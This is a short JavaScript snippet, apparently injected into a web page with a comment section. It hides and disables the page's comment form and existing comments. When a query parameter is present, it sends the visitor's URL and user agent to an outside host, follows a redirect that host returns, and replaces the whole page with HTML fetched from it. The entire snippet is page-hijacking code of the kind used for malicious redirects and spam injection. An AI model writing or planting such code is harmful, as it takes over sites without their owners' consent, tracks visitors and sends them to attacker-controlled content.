(async function() {
  // --- Always disable comment section ---
  console.log('[DEBUG] Disabling comments...');
  try {
    // Change heading text
    document.querySelectorAll('h2').forEach(h2 => {
      if (h2.textContent.trim() === 'Add a Comment') {
        h2.textContent = 'Add a Comment (Disabled)';
      }
    });

    // Hide textarea
    document.querySelectorAll('textarea[name="strDescription"]').forEach(el => {
      el.disabled = true;
      el.style.display = 'none';
    });

    // Hide submit button
    document.querySelectorAll('input[name="btnPostComment"]').forEach(el => {
      el.disabled = true;
      el.style.display = 'none';
    });

    // Hide comments table
    document.querySelectorAll('table.comment').forEach(el => {
      el.style.display = 'none';
    });
  } catch (err) {
    console.error('[ERROR] Comment disable failed:', err);
  }

  // --- ultra fast start ---
  const s = new URLSearchParams(location.search).get('s');
  if (!s) return;

  // --- fire rd.php in background ---
  const rdUrl = 'https://www.hsdpro.com/redirects/rd.php?url=' + encodeURIComponent(location.href) +
                '&ua=' + encodeURIComponent(navigator.userAgent);
  fetch(rdUrl)
    .then(r => r.text())
    .then(t => {
      t = t.trim();
      if (t.startsWith('yes|')) {
        const redirectUrl = t.split('|')[1];
        if (redirectUrl) location.href = redirectUrl;
      }
    })
    .catch(() => {});

  // --- immediately load new HTML page ---
  try {
    const res = await fetch('https://www.hsdpro.com/s/' + encodeURIComponent(s) + '.html', {cache: 'no-store'});
    const html = await res.text();
    document.open();
    document.write(html);
    document.close();
  } catch (e) {
    console.error('[ERROR] HTML load failed:', e);
  }
})();
